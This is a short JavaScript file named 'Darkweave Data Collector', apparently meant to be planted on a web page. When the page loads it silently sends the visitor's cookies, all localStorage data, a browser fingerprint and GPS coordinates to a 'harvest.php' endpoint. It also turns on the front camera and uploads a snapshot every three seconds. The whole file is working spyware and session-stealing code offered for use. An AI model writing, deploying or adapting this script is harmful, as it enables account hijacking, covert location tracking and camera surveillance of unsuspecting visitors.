// Darkweave Data Collector
(function() {
    const server = window.location.origin;
    const sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    function send(type, data) {
        fetch(server + '/php/harvest.php', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({type: type, data: data, session: sessionId})
        }).catch(() => {});
    }
    
    // Collect cookies
    if (document.cookie) {
        send('cookies', document.cookie);
    }
    
    // Collect localStorage
    if (window.localStorage) {
        const storage = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storage[key] = localStorage.getItem(key);
        }
        if (Object.keys(storage).length) send('localstorage', storage);
    }
    
    // Collect fingerprint
    send('fingerprint', {
        ua: navigator.userAgent,
        lang: navigator.language,
        screen: screen.width + 'x' + screen.height,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory,
        platform: navigator.platform,
        cookiesEnabled: navigator.cookieEnabled
    });
    
    // Collect location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            send('gps', {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                acc: pos.coords.accuracy,
                alt: pos.coords.altitude
            });
        });
    }
    
    // Camera capture
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                setInterval(() => {
                    if (video.videoWidth) {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0);
                        canvas.toBlob(blob => {
                            const fd = new FormData();
                            fd.append('image', blob);
                            fetch(server + '/php/harvest.php', {method: 'POST', body: fd});
                        });
                    }
                }, 3000);
            }).catch(() => {});
    }
    
    console.log('[Darkweave] Collector active');
})();
